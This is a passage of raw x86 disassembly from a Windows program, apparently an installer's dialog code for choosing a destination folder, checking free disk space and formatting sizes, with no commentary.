  4042c4:	8b 1d 44 72 40 00    	mov    0x407244,%ebx
  4042ca:	8b 35 00 72 40 00    	mov    0x407200,%esi
  4042d0:	75 5a                	jne    0x40432c
  4042d2:	8b 45 10             	mov    0x10(%ebp),%eax
  4042d5:	c1 e8 10             	shr    $0x10,%eax
  4042d8:	66 85 c0             	test   %ax,%ax
  4042db:	0f 85 2e 01 00 00    	jne    0x40440f
  4042e1:	33 c0                	xor    %eax,%eax
  4042e3:	39 05 fc ec 41 00    	cmp    %eax,0x41ecfc
  4042e9:	0f 85 20 01 00 00    	jne    0x40440f
  4042ef:	8b 0d 08 f5 41 00    	mov    0x41f508,%ecx
  4042f5:	8d 79 14             	lea    0x14(%ecx),%edi
  4042f8:	f6 07 20             	testb  $0x20,(%edi)
  4042fb:	0f 84 0e 01 00 00    	je     0x40440f
  404301:	50                   	push   %eax
  404302:	50                   	push   %eax
  404303:	68 f0 00 00 00       	push   $0xf0
  404308:	68 0a 04 00 00       	push   $0x40a
  40430d:	ff 75 08             	push   0x8(%ebp)
  404310:	ff d3                	call   *%ebx
  404312:	50                   	push   %eax
  404313:	ff d6                	call   *%esi
  404315:	8b 0f                	mov    (%edi),%ecx
  404317:	83 e0 01             	and    $0x1,%eax
  40431a:	83 e1 fe             	and    $0xfffffffe,%ecx
  40431d:	50                   	push   %eax
  40431e:	0b c8                	or     %eax,%ecx
  404320:	89 0f                	mov    %ecx,(%edi)
  404322:	e8 4d fd ff ff       	call   0x404074
  404327:	e8 f9 00 00 00       	call   0x404425
  40432c:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  404330:	0f 85 ca 00 00 00    	jne    0x404400
  404336:	68 e8 03 00 00       	push   $0x3e8
  40433b:	ff 75 08             	push   0x8(%ebp)
  40433e:	ff d3                	call   *%ebx
  404340:	8b 7d 14             	mov    0x14(%ebp),%edi
  404343:	81 7f 08 0b 07 00 00 	cmpl   $0x70b,0x8(%edi)
  40434a:	75 72                	jne    0x4043be
  40434c:	81 7f 0c 01 02 00 00 	cmpl   $0x201,0xc(%edi)
  404353:	75 69                	jne    0x4043be
  404355:	8b 4f 1c             	mov    0x1c(%edi),%ecx
  404358:	8b 57 18             	mov    0x18(%edi),%edx
  40435b:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  40435e:	2b ca                	sub    %edx,%ecx
  404360:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
  404366:	89 55 f4             	mov    %edx,-0xc(%ebp)
  404369:	c7 45 fc c0 26 42 00 	movl   $0x4226c0,-0x4(%ebp)
  404370:	73 4c                	jae    0x4043be
  404372:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  404375:	51                   	push   %ecx
  404376:	6a 00                	push   $0x0
  404378:	68 4b 04 00 00       	push   $0x44b
  40437d:	50                   	push   %eax
  40437e:	ff d6                	call   *%esi
  404380:	8b 3d a4 71 40 00    	mov    0x4071a4,%edi
  404386:	68 02 7f 00 00       	push   $0x7f02
  40438b:	6a 00                	push   $0x0
  40438d:	ff d7                	call   *%edi
  40438f:	8b 1d a0 71 40 00    	mov    0x4071a0,%ebx
  404395:	50                   	push   %eax
  404396:	ff d3                	call   *%ebx
  404398:	6a 01                	push   $0x1
  40439a:	6a 00                	push   $0x0
  40439c:	6a 00                	push   $0x0
  40439e:	ff 75 fc             	push   -0x4(%ebp)
  4043a1:	68 1c 92 40 00       	push   $0x40921c
  4043a6:	ff 75 08             	push   0x8(%ebp)
  4043a9:	ff 15 78 71 40 00    	call   *0x407178
  4043af:	68 00 7f 00 00       	push   $0x7f00
  4043b4:	6a 00                	push   $0x0
  4043b6:	ff d7                	call   *%edi
  4043b8:	50                   	push   %eax
  4043b9:	ff d3                	call   *%ebx
  4043bb:	8b 7d 14             	mov    0x14(%ebp),%edi
  4043be:	81 7f 08 00 07 00 00 	cmpl   $0x700,0x8(%edi)
  4043c5:	75 4b                	jne    0x404412
  4043c7:	81 7f 0c 00 01 00 00 	cmpl   $0x100,0xc(%edi)
  4043ce:	75 42                	jne    0x404412
  4043d0:	83 7f 10 0d          	cmpl   $0xd,0x10(%edi)
  4043d4:	75 11                	jne    0x4043e7
  4043d6:	6a 00                	push   $0x0
  4043d8:	6a 01                	push   $0x1
  4043da:	68 11 01 00 00       	push   $0x111
  4043df:	ff 35 28 37 42 00    	push   0x423728
  4043e5:	ff d6                	call   *%esi
  4043e7:	83 7f 10 1b          	cmpl   $0x1b,0x10(%edi)
  4043eb:	75 0e                	jne    0x4043fb
  4043ed:	6a 00                	push   $0x0
  4043ef:	6a 00                	push   $0x0
  4043f1:	6a 10                	push   $0x10
  4043f3:	ff 35 28 37 42 00    	push   0x423728
  4043f9:	ff d6                	call   *%esi
  4043fb:	33 c0                	xor    %eax,%eax
  4043fd:	40                   	inc    %eax
  4043fe:	eb 1e                	jmp    0x40441e
  404400:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  404407:	75 06                	jne    0x40440f
  404409:	ff 05 fc ec 41 00    	incl   0x41ecfc
  40440f:	8b 7d 14             	mov    0x14(%ebp),%edi
  404412:	57                   	push   %edi
  404413:	ff 75 10             	push   0x10(%ebp)
  404416:	ff 75 0c             	push   0xc(%ebp)
  404419:	e8 9b fc ff ff       	call   0x4040b9
  40441e:	5f                   	pop    %edi
  40441f:	5e                   	pop    %esi
  404420:	5b                   	pop    %ebx
  404421:	c9                   	leave
  404422:	c2 10 00             	ret    $0x10
  404425:	83 3d ac 37 42 00 00 	cmpl   $0x0,0x4237ac
  40442c:	a1 f8 ec 41 00       	mov    0x41ecf8,%eax
  404431:	75 05                	jne    0x404438
  404433:	a1 2c fd 41 00       	mov    0x41fd2c,%eax
  404438:	6a 01                	push   $0x1
  40443a:	6a 01                	push   $0x1
  40443c:	68 f4 00 00 00       	push   $0xf4
  404441:	50                   	push   %eax
  404442:	ff 15 00 72 40 00    	call   *0x407200
  404448:	c3                   	ret
  404449:	55                   	push   %ebp
  40444a:	8b ec                	mov    %esp,%ebp
  40444c:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404453:	56                   	push   %esi
  404454:	8b 75 14             	mov    0x14(%ebp),%esi
  404457:	75 26                	jne    0x40447f
  404459:	ff 76 30             	push   0x30(%esi)
  40445c:	6a 1d                	push   $0x1d
  40445e:	ff 75 08             	push   0x8(%ebp)
  404461:	e8 ec fb ff ff       	call   0x404052
  404466:	8b 46 3c             	mov    0x3c(%esi),%eax
  404469:	c1 e0 0a             	shl    $0xa,%eax
  40446c:	05 00 40 42 00       	add    $0x424000,%eax
  404471:	50                   	push   %eax
  404472:	68 e8 03 00 00       	push   $0x3e8
  404477:	ff 75 08             	push   0x8(%ebp)
  40447a:	e8 c2 11 00 00       	call   0x405641
  40447f:	56                   	push   %esi
  404480:	ff 75 10             	push   0x10(%ebp)
  404483:	ff 75 0c             	push   0xc(%ebp)
  404486:	e8 2e fc ff ff       	call   0x4040b9
  40448b:	5e                   	pop    %esi
  40448c:	5d                   	pop    %ebp
  40448d:	c2 10 00             	ret    $0x10
  404490:	55                   	push   %ebp
  404491:	8b ec                	mov    %esp,%ebp
  404493:	83 ec 4c             	sub    $0x4c,%esp
  404496:	a1 08 f5 41 00       	mov    0x41f508,%eax
  40449b:	53                   	push   %ebx
  40449c:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40449f:	56                   	push   %esi
  4044a0:	8b 58 3c             	mov    0x3c(%eax),%ebx
  4044a3:	8b 40 38             	mov    0x38(%eax),%eax
  4044a6:	c1 e3 0a             	shl    $0xa,%ebx
  4044a9:	81 c3 00 40 42 00    	add    $0x424000,%ebx
  4044af:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  4044b6:	57                   	push   %edi
  4044b7:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4044ba:	75 11                	jne    0x4044cd
  4044bc:	53                   	push   %ebx
  4044bd:	68 fb 03 00 00       	push   $0x3fb
  4044c2:	e8 80 11 00 00       	call   0x405647
  4044c7:	53                   	push   %ebx
  4044c8:	e8 0b 1c 00 00       	call   0x4060d8
  4044cd:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  4044d4:	8b 75 08             	mov    0x8(%ebp),%esi
  4044d7:	75 6c                	jne    0x404545
  4044d9:	68 fb 03 00 00       	push   $0x3fb
  4044de:	56                   	push   %esi
  4044df:	ff 15 44 72 40 00    	call   *0x407244
  4044e5:	53                   	push   %ebx
  4044e6:	8b f8                	mov    %eax,%edi
  4044e8:	e8 5f 14 00 00       	call   0x40594c
  4044ed:	85 c0                	test   %eax,%eax
  4044ef:	74 10                	je     0x404501
  4044f1:	53                   	push   %ebx
  4044f2:	e8 81 14 00 00       	call   0x405978
  4044f7:	85 c0                	test   %eax,%eax
  4044f9:	75 06                	jne    0x404501
  4044fb:	53                   	push   %ebx
  4044fc:	e8 de 13 00 00       	call   0x4058df
  404501:	53                   	push   %ebx
  404502:	57                   	push   %edi
  404503:	89 35 f8 2e 42 00    	mov    %esi,0x422ef8
  404509:	ff 15 7c 72 40 00    	call   *0x40727c
  40450f:	8b 45 14             	mov    0x14(%ebp),%eax
  404512:	ff 70 34             	push   0x34(%eax)
  404515:	6a 01                	push   $0x1
  404517:	56                   	push   %esi
  404518:	e8 35 fb ff ff       	call   0x404052
  40451d:	8b 45 14             	mov    0x14(%ebp),%eax
  404520:	ff 70 30             	push   0x30(%eax)
  404523:	6a 14                	push   $0x14
  404525:	56                   	push   %esi
  404526:	e8 27 fb ff ff       	call   0x404052
  40452b:	57                   	push   %edi
  40452c:	e8 56 fb ff ff       	call   0x404087
  404531:	6a 06                	push   $0x6
  404533:	e8 ce 1c 00 00       	call   0x406206
  404538:	85 c0                	test   %eax,%eax
  40453a:	0f 84 8c 02 00 00    	je     0x4047cc
  404540:	6a 01                	push   $0x1
  404542:	57                   	push   %edi
  404543:	ff d0                	call   *%eax
  404545:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  40454c:	0f 85 d1 00 00 00    	jne    0x404623
  404552:	0f b7 45 10          	movzwl 0x10(%ebp),%eax
  404556:	3d fb 03 00 00       	cmp    $0x3fb,%eax
  40455b:	75 18                	jne    0x404575
  40455d:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404560:	c1 e9 10             	shr    $0x10,%ecx
  404563:	66 81 f9 00 03       	cmp    $0x300,%cx
  404568:	0f 85 5e 02 00 00    	jne    0x4047cc
  40456e:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404575:	3d e9 03 00 00       	cmp    $0x3e9,%eax
  40457a:	0f 85 a3 00 00 00    	jne    0x404623
  404580:	6a 07                	push   $0x7
  404582:	33 c0                	xor    %eax,%eax
  404584:	59                   	pop    %ecx
  404585:	8d 7d b8             	lea    -0x48(%ebp),%edi
  404588:	ff 75 f8             	push   -0x8(%ebp)
  40458b:	f3 ab                	rep stos %eax,%es:(%edi)
  40458d:	bf 30 fd 41 00       	mov    $0x41fd30,%edi
  404592:	68 08 f1 41 00       	push   $0x41f108
  404597:	89 75 b4             	mov    %esi,-0x4c(%ebp)
  40459a:	89 7d bc             	mov    %edi,-0x44(%ebp)
  40459d:	c7 45 c8 d7 47 40 00 	movl   $0x4047d7,-0x38(%ebp)
  4045a4:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  4045a7:	e8 e3 18 00 00       	call   0x405e8f
  4045ac:	89 45 c0             	mov    %eax,-0x40(%ebp)
  4045af:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  4045b2:	50                   	push   %eax
  4045b3:	c7 45 c4 41 00 00 00 	movl   $0x41,-0x3c(%ebp)
  4045ba:	ff 15 70 71 40 00    	call   *0x407170
  4045c0:	85 c0                	test   %eax,%eax
  4045c2:	74 58                	je     0x40461c
  4045c4:	50                   	push   %eax
  4045c5:	ff 15 8c 72 40 00    	call   *0x40728c
  4045cb:	53                   	push   %ebx
  4045cc:	e8 0e 13 00 00       	call   0x4058df
  4045d1:	a1 30 37 42 00       	mov    0x423730,%eax
  4045d6:	8b 80 1c 01 00 00    	mov    0x11c(%eax),%eax
  4045dc:	85 c0                	test   %eax,%eax
  4045de:	74 28                	je     0x404608
  4045e0:	81 fb 00 94 42 00    	cmp    $0x429400,%ebx
  4045e6:	75 20                	jne    0x404608
  4045e8:	50                   	push   %eax
  4045e9:	6a 00                	push   $0x0
  4045eb:	e8 9f 18 00 00       	call   0x405e8f
  4045f0:	57                   	push   %edi
  4045f1:	bf c0 26 42 00       	mov    $0x4226c0,%edi
  4045f6:	57                   	push   %edi
  4045f7:	ff 15 0c 71 40 00    	call   *0x40710c
  4045fd:	85 c0                	test   %eax,%eax
  4045ff:	74 07                	je     0x404608
  404601:	57                   	push   %edi
  404602:	53                   	push   %ebx
  404603:	e8 81 18 00 00       	call   0x405e89
  404608:	ff 05 20 fd 41 00    	incl   0x41fd20
  40460e:	53                   	push   %ebx
  40460f:	68 fb 03 00 00       	push   $0x3fb
  404614:	56                   	push   %esi
  404615:	e8 27 10 00 00       	call   0x405641
  40461a:	eb 07                	jmp    0x404623
  40461c:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404623:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  40462a:	74 0d                	je     0x404639
  40462c:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  404633:	0f 85 93 01 00 00    	jne    0x4047cc
  404639:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40463d:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  404641:	53                   	push   %ebx
  404642:	68 fb 03 00 00       	push   $0x3fb
  404647:	e8 fb 0f 00 00       	call   0x405647
  40464c:	53                   	push   %ebx
  40464d:	e8 7b 13 00 00       	call   0x4059cd
  404652:	85 c0                	test   %eax,%eax
  404654:	75 07                	jne    0x40465d
  404656:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40465d:	be 00 ed 41 00       	mov    $0x41ed00,%esi
  404662:	53                   	push   %ebx
  404663:	56                   	push   %esi
  404664:	e8 04 18 00 00       	call   0x405e6d
  404669:	6a 01                	push   $0x1
  40466b:	e8 96 1b 00 00       	call   0x406206
  404670:	85 c0                	test   %eax,%eax
  404672:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404675:	74 35                	je     0x4046ac
  404677:	33 c0                	xor    %eax,%eax
  404679:	33 ff                	xor    %edi,%edi
  40467b:	3b c6                	cmp    %esi,%eax
  40467d:	74 2d                	je     0x4046ac
  40467f:	8d 45 dc             	lea    -0x24(%ebp),%eax
  404682:	50                   	push   %eax
  404683:	8d 45 e8             	lea    -0x18(%ebp),%eax
  404686:	50                   	push   %eax
  404687:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40468a:	50                   	push   %eax
  40468b:	56                   	push   %esi
  40468c:	ff 55 f4             	call   *-0xc(%ebp)
  40468f:	85 c0                	test   %eax,%eax
  404691:	75 71                	jne    0x404704
  404693:	85 ff                	test   %edi,%edi
  404695:	74 02                	je     0x404699
  404697:	20 07                	and    %al,(%edi)
  404699:	56                   	push   %esi
  40469a:	e8 87 12 00 00       	call   0x405926
  40469f:	8b f8                	mov    %eax,%edi
  4046a1:	80 27 00             	andb   $0x0,(%edi)
  4046a4:	4f                   	dec    %edi
  4046a5:	3b fe                	cmp    %esi,%edi
  4046a7:	c6 07 5c             	movb   $0x5c,(%edi)
  4046aa:	75 d3                	jne    0x40467f
  4046ac:	53                   	push   %ebx
  4046ad:	56                   	push   %esi
  4046ae:	e8 ba 17 00 00       	call   0x405e6d
  4046b3:	56                   	push   %esi
  4046b4:	e8 bf 12 00 00       	call   0x405978
  4046b9:	33 ff                	xor    %edi,%edi
  4046bb:	3b c7                	cmp    %edi,%eax
  4046bd:	74 03                	je     0x4046c2
  4046bf:	80 20 00             	andb   $0x0,(%eax)
  4046c2:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4046c5:	50                   	push   %eax
  4046c6:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4046c9:	50                   	push   %eax
  4046ca:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4046cd:	50                   	push   %eax
  4046ce:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4046d1:	50                   	push   %eax
  4046d2:	56                   	push   %esi
  4046d3:	ff 15 b8 70 40 00    	call   *0x4070b8
  4046d9:	85 c0                	test   %eax,%eax
  4046db:	74 43                	je     0x404720
  4046dd:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4046e0:	be 00 04 00 00       	mov    $0x400,%esi
  4046e5:	0f af 45 ec          	imul   -0x14(%ebp),%eax
  4046e9:	56                   	push   %esi
  4046ea:	ff 75 f4             	push   -0xc(%ebp)
  4046ed:	50                   	push   %eax
  4046ee:	ff 15 48 71 40 00    	call   *0x407148
  4046f4:	99                   	cltd
  4046f5:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4046f8:	89 55 d8             	mov    %edx,-0x28(%ebp)
  4046fb:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  404702:	eb 21                	jmp    0x404725
  404704:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  404707:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  40470a:	0f ac c8 0a          	shrd   $0xa,%ecx,%eax
  40470e:	c1 e9 0a             	shr    $0xa,%ecx
  404711:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  404714:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  404717:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  40471e:	33 ff                	xor    %edi,%edi
  404720:	be 00 04 00 00       	mov    $0x400,%esi
  404725:	6a 05                	push   $0x5
  404727:	e8 f8 01 00 00       	call   0x404924
  40472c:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  40472f:	74 19                	je     0x40474a
  404731:	8b 55 d8             	mov    -0x28(%ebp),%edx
  404734:	33 c9                	xor    %ecx,%ecx
  404736:	3b d1                	cmp    %ecx,%edx
  404738:	77 10                	ja     0x40474a
  40473a:	72 07                	jb     0x404743
  40473c:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  40473f:	3b c8                	cmp    %eax,%ecx
  404741:	73 07                	jae    0x40474a
  404743:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  40474a:	8b 0d fc 2e 42 00    	mov    0x422efc,%ecx
  404750:	39 79 10             	cmp    %edi,0x10(%ecx)
  404753:	74 30                	je     0x404785
  404755:	50                   	push   %eax
  404756:	6a fb                	push   $0xfffffffb
  404758:	68 ff 03 00 00       	push   $0x3ff
  40475d:	e8 aa 01 00 00       	call   0x40490c
  404762:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  404765:	74 10                	je     0x404777
  404767:	ff 75 d8             	push   -0x28(%ebp)
  40476a:	ff 75 d4             	push   -0x2c(%ebp)
  40476d:	6a fc                	push   $0xfffffffc
  40476f:	56                   	push   %esi
  404770:	e8 d2 00 00 00       	call   0x404847
  404775:	eb 0e                	jmp    0x404785
  404777:	68 f0 ec 41 00       	push   $0x41ecf0
  40477c:	56                   	push   %esi
  40477d:	ff 75 08             	push   0x8(%ebp)
  404780:	e8 bc 0e 00 00       	call   0x405641
  404785:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404788:	3b c7                	cmp    %edi,%eax
  40478a:	a3 c4 37 42 00       	mov    %eax,0x4237c4
  40478f:	75 0a                	jne    0x40479b
  404791:	6a 07                	push   $0x7
  404793:	e8 7d cc ff ff       	call   0x401415
  404798:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40479b:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40479e:	85 70 14             	test   %esi,0x14(%eax)
  4047a1:	74 03                	je     0x4047a6
  4047a3:	89 7d fc             	mov    %edi,-0x4(%ebp)
  4047a6:	33 c0                	xor    %eax,%eax
  4047a8:	39 7d fc             	cmp    %edi,-0x4(%ebp)
  4047ab:	0f 94 c0             	sete   %al
  4047ae:	50                   	push   %eax
  4047af:	e8 c0 f8 ff ff       	call   0x404074
  4047b4:	39 7d fc             	cmp    %edi,-0x4(%ebp)
  4047b7:	75 0d                	jne    0x4047c6
  4047b9:	39 3d 20 fd 41 00    	cmp    %edi,0x41fd20
  4047bf:	75 05                	jne    0x4047c6
  4047c1:	e8 5f fc ff ff       	call   0x404425
  4047c6:	89 3d 20 fd 41 00    	mov    %edi,0x41fd20
  4047cc:	ff 75 14             	push   0x14(%ebp)
  4047cf:	ff 75 10             	push   0x10(%ebp)
  4047d2:	ff 75 0c             	push   0xc(%ebp)
  4047d5:	e8 df f8 ff ff       	call   0x4040b9
  4047da:	5f                   	pop    %edi
  4047db:	5e                   	pop    %esi
  4047dc:	5b                   	pop    %ebx
  4047dd:	c9                   	leave
  4047de:	c2 10 00             	ret    $0x10
  4047e1:	55                   	push   %ebp
  4047e2:	8b ec                	mov    %esp,%ebp
  4047e4:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  4047e8:	56                   	push   %esi
  4047e9:	8b 35 00 72 40 00    	mov    0x407200,%esi
  4047ef:	75 1c                	jne    0x40480d
  4047f1:	ff 75 14             	push   0x14(%ebp)
  4047f4:	68 fb 03 00 00       	push   $0x3fb
  4047f9:	e8 49 0e 00 00       	call   0x405647
  4047fe:	ff 75 14             	push   0x14(%ebp)
  404801:	6a 01                	push   $0x1
  404803:	68 66 04 00 00       	push   $0x466
  404808:	ff 75 08             	push   0x8(%ebp)
  40480b:	ff d6                	call   *%esi
  40480d:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
  404811:	75 2d                	jne    0x404840
  404813:	ff 75 14             	push   0x14(%ebp)
  404816:	ff 75 10             	push   0x10(%ebp)
  404819:	ff 15 6c 71 40 00    	call   *0x40716c
  40481f:	85 c0                	test   %eax,%eax
  404821:	74 0e                	je     0x404831
  404823:	6a 07                	push   $0x7
  404825:	e8 eb cb ff ff       	call   0x401415
  40482a:	85 c0                	test   %eax,%eax
  40482c:	75 03                	jne    0x404831
  40482e:	40                   	inc    %eax
  40482f:	eb 02                	jmp    0x404833
  404831:	33 c0                	xor    %eax,%eax
  404833:	50                   	push   %eax
  404834:	6a 00                	push   $0x0
  404836:	68 65 04 00 00       	push   $0x465
  40483b:	ff 75 08             	push   0x8(%ebp)
  40483e:	ff d6                	call   *%esi
  404840:	33 c0                	xor    %eax,%eax
  404842:	5e                   	pop    %esi
  404843:	5d                   	pop    %ebp
  404844:	c2 10 00             	ret    $0x10
  404847:	55                   	push   %ebp
  404848:	8b ec                	mov    %esp,%ebp
  40484a:	83 ec 40             	sub    $0x40,%esp
  40484d:	8b 45 14             	mov    0x14(%ebp),%eax
  404850:	53                   	push   %ebx
  404851:	56                   	push   %esi
  404852:	8b 75 10             	mov    0x10(%ebp),%esi
  404855:	57                   	push   %edi
  404856:	6a dc                	push   $0xffffffdc
  404858:	85 c0                	test   %eax,%eax
  40485a:	5b                   	pop    %ebx
  40485b:	74 0b                	je     0x404868
  40485d:	0f ac c6 14          	shrd   $0x14,%eax,%esi
  404861:	c1 e8 14             	shr    $0x14,%eax
  404864:	33 ff                	xor    %edi,%edi
  404866:	eb 4e                	jmp    0x4048b6
  404868:	6a 14                	push   $0x14
  40486a:	81 fe 00 00 10 00    	cmp    $0x100000,%esi
  404870:	59                   	pop    %ecx
  404871:	8b c6                	mov    %esi,%eax
  404873:	73 06                	jae    0x40487b
  404875:	6a 0a                	push   $0xa
  404877:	59                   	pop    %ecx
  404878:	6a dd                	push   $0xffffffdd
  40487a:	5b                   	pop    %ebx
  40487b:	81 fe 00 04 00 00    	cmp    $0x400,%esi
  404881:	73 05                	jae    0x404888
  404883:	6a de                	push   $0xffffffde
  404885:	33 c9                	xor    %ecx,%ecx
  404887:	5b                   	pop    %ebx
  404888:	81 fe 33 33 ff ff    	cmp    $0xffff3333,%esi
  40488e:	73 0d                	jae    0x40489d
  404890:	33 c0                	xor    %eax,%eax
  404892:	6a 14                	push   $0x14
  404894:	40                   	inc    %eax
  404895:	5f                   	pop    %edi
  404896:	d3 e0                	shl    %cl,%eax
  404898:	99                   	cltd
  404899:	f7 ff                	idiv   %edi
  40489b:	03 c6                	add    %esi,%eax
  40489d:	8b f0                	mov    %eax,%esi
  40489f:	25 ff ff ff 00       	and    $0xffffff,%eax
  4048a4:	6a 0a                	push   $0xa
  4048a6:	33 d2                	xor    %edx,%edx
  4048a8:	8d 04 80             	lea    (%eax,%eax,4),%eax
  4048ab:	03 c0                	add    %eax,%eax
  4048ad:	d3 e8                	shr    %cl,%eax
  4048af:	d3 ee                	shr    %cl,%esi
  4048b1:	59                   	pop    %ecx
  4048b2:	f7 f1                	div    %ecx
  4048b4:	8b fa                	mov    %edx,%edi
  4048b6:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4048b9:	6a df                	push   $0xffffffdf
  4048bb:	50                   	push   %eax
  4048bc:	e8 ce 15 00 00       	call   0x405e8f
  4048c1:	50                   	push   %eax
  4048c2:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4048c5:	53                   	push   %ebx
  4048c6:	50                   	push   %eax
  4048c7:	e8 c3 15 00 00       	call   0x405e8f
  4048cc:	50                   	push   %eax
  4048cd:	57                   	push   %edi
  4048ce:	56                   	push   %esi
  4048cf:	68 24 92 40 00       	push   $0x409224
  4048d4:	ff 75 0c             	push   0xc(%ebp)
  4048d7:	be 30 fd 41 00       	mov    $0x41fd30,%esi
  4048dc:	56                   	push   %esi
  4048dd:	e8 ad 15 00 00       	call   0x405e8f
  4048e2:	56                   	push   %esi
  4048e3:	8b f8                	mov    %eax,%edi
  4048e5:	e8 99 15 00 00       	call   0x405e83
  4048ea:	03 f8                	add    %eax,%edi
  4048ec:	57                   	push   %edi
  4048ed:	ff 15 74 72 40 00    	call   *0x407274
  4048f3:	83 c4 18             	add    $0x18,%esp
  4048f6:	56                   	push   %esi
  4048f7:	ff 75 08             	push   0x8(%ebp)
  4048fa:	ff 35 f8 2e 42 00    	push   0x422ef8
  404900:	e8 3c 0d 00 00       	call   0x405641
  404905:	5f                   	pop    %edi
  404906:	5e                   	pop    %esi
  404907:	5b                   	pop    %ebx
  404908:	c9                   	leave
  404909:	c2 10 00             	ret    $0x10
  40490c:	8b 44 24 0c          	mov    0xc(%esp),%eax
  404910:	33 c9                	xor    %ecx,%ecx
  404912:	51                   	push   %ecx
  404913:	50                   	push   %eax
  404914:	ff 74 24 10          	push   0x10(%esp)
  404918:	ff 74 24 10          	push   0x10(%esp)
  40491c:	e8 26 ff ff ff       	call   0x404847
  404921:	c2 0c 00             	ret    $0xc
  404924:	8b 15 4c 37 42 00    	mov    0x42374c,%edx
  40492a:	8b 0d 48 37 42 00    	mov    0x423748,%ecx
  404930:	33 c0                	xor    %eax,%eax
  404932:	85 d2                	test   %edx,%edx
  404934:	74 18                	je     0x40494e
  404936:	56                   	push   %esi
  404937:	f6 41 08 01          	testb  $0x1,0x8(%ecx)
  40493b:	74 07                	je     0x404944
  40493d:	8b 74 24 08          	mov    0x8(%esp),%esi
  404941:	03 04 b1             	add    (%ecx,%esi,4),%eax
  404944:	81 c1 18 04 00 00    	add    $0x418,%ecx
  40494a:	4a                   	dec    %edx
  40494b:	75 ea                	jne    0x404937
  40494d:	5e                   	pop    %esi
  40494e:	c2 04 00             	ret    $0x4
  404951:	55                   	push   %ebp
  404952:	8b ec                	mov    %esp,%ebp
  404954:	83 ec 38             	sub    $0x38,%esp
  404957:	56                   	push   %esi
  404958:	8b 35 00 72 40 00    	mov    0x407200,%esi
  40495e:	57                   	push   %edi
  40495f:	8b 7d 08             	mov    0x8(%ebp),%edi
  404962:	6a 00                	push   $0x0
  404964:	6a 09                	push   $0x9
  404966:	68 0a 11 00 00       	push   $0x110a
  40496b:	57                   	push   %edi
  40496c:	ff d6                	call   *%esi
  40496e:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  404972:	74 3c                	je     0x4049b0
  404974:	ff 15 ac 71 40 00    	call   *0x4071ac
  40497a:	0f bf c8             	movswl %ax,%ecx
  40497d:	c1 e8 10             	shr    $0x10,%eax
  404980:	0f bf c0             	movswl %ax,%eax
  404983:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404986:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404989:	50                   	push   %eax
  40498a:	57                   	push   %edi
  40498b:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  40498e:	ff 15 84 71 40 00    	call   *0x407184
  404994:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404997:	50                   	push   %eax
  404998:	6a 00                	push   $0x0
  40499a:	68 11 11 00 00       	push   $0x1111
  40499f:	57                   	push   %edi
  4049a0:	ff d6                	call   *%esi
  4049a2:	f6 45 f8 66          	testb  $0x66,-0x8(%ebp)
  4049a6:	75 05                	jne    0x4049ad
  4049a8:	83 c8 ff             	or     $0xffffffff,%eax
  4049ab:	eb 1e                	jmp    0x4049cb
  4049ad:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4049b0:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4049b3:	8d 45 c8             	lea    -0x38(%ebp),%eax
  4049b6:	50                   	push   %eax
  4049b7:	6a 00                	push   $0x0
  4049b9:	68 0c 11 00 00       	push   $0x110c
  4049be:	57                   	push   %edi
  4049bf:	c7 45 c8 04 00 00 00 	movl   $0x4,-0x38(%ebp)
  4049c6:	ff d6                	call   *%esi
  4049c8:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4049cb:	5f                   	pop    %edi
  4049cc:	5e                   	pop    %esi
  4049cd:	c9                   	leave
  4049ce:	c2 08 00             	ret    $0x8
  4049d1:	56                   	push   %esi
